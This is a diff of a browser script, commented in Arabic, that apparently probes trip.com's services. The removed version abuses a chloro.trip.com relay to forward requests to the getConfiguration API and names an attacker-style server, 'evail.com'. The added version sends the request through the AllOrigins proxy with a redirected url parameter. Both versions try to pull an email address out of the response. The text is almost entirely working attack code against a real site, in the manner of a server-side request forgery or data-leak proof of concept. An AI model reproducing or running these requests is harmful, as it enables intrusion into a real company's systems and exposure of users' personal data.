@@ -8,66 +8,55 @@
 
 <script>
 
-// ===== إرسال الطلب إلى chloro.trip.com =====
-const TARGET_URL = "https://chloro.trip.com/v2/d";
+// ===== استخدم AllOrigins بالطريقة الصحيحة =====
+const PROXY_URL = "https://api.allorigins.win/get?url=";
+const TARGET_URL = "https://www.trip.com/restapi/soa2/24884/json/getConfiguration?url=https://omar.trip.com";
 
-// ===== البيانات (body) المرسلة إلى chloro.trip.com =====
-// هذا هو الطلب الذي سيرسله chloro.trip.com إلى trip.com/restapi/...
-const requestBody = new URLSearchParams({
-    data: JSON.stringify({
-        url: "https://www.trip.com/restapi/soa2/24884/json/getConfiguration",
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: {
-            head: {
-                locale: "",
-                currency: "",
-                vID: ""
-            },
-            platform: "Online",
-            componentType: "online-app-download-universal",
-            version: "6.0.5",
-            pageId: "10320668151",
-            aid: 0,
-            sid: 0,
-            customId: "adBanner",
-            customParam: {}
-        }
-    }),
-    version: "11",
-    serverName: "http://evail.com"
-}).toString();
+// البيانات المرسلة لـ Trip.com
+const tripData = {
+    head: {
+        locale: "ar-XX",
+        currency: "USD",
+        vID: "1783978788105.8e68P1hvGdSY"
+    },
+    platform: "Online",
+    componentType: "online-app-download-universal",
+    version: "6.0.5",
+    pageId: "10320668148",
+    aid: 0,
+    sid: 0,
+    customId: "side",
+    customParam: {}
+};
 
-// ===== إرسال الطلب =====
-fetch(TARGET_URL, {
+// ===== إرسال الطلب عبر Proxy =====
+fetch(PROXY_URL + encodeURIComponent(TARGET_URL), {
     method: "POST",
     headers: {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-        "Accept": "*/*",
-        "Origin": "https://www.com"
+        "Content-Type": "application/json"
     },
-    body: requestBody
+    body: JSON.stringify(tripData)
 })
 
-.then(async r => {
-    const status = r.status;
-    const responseText = await r.text();
+// AllOrigins يرجع JSON فيه حقل contents
+.then(r => r.json())
+.then(data => {
+    // الرد الأصلي موجود في data.contents
+    const responseText = data.contents;
     
     document.getElementById("result").textContent = 
-    "Status: " + status + "\n\n" + responseText;
+    "Status: 200\n\n" + responseText;
     
-    // محاولة استخراج الإيميل من الرد
+    // محاولة استخراج الإيميل من الرد للتحقق
     try {
         const jsonResponse = JSON.parse(responseText);
         if (jsonResponse.email) {
-            document.getElementById("result").textContent += 
-            "\n\n📧 الإيميل: " + jsonResponse.email;
+            console.log("✅ الإيميل موجود:", jsonResponse.email);
+        } else {
+            console.log("⚠️ الإيميل غير موجود في الرد");
         }
-        console.log("✅ الرد:", jsonResponse);
     } catch(e) {
-        console.log("الرد ليس JSON");
+        console.log("الرد ليس JSON صالح");
     }
 })
 
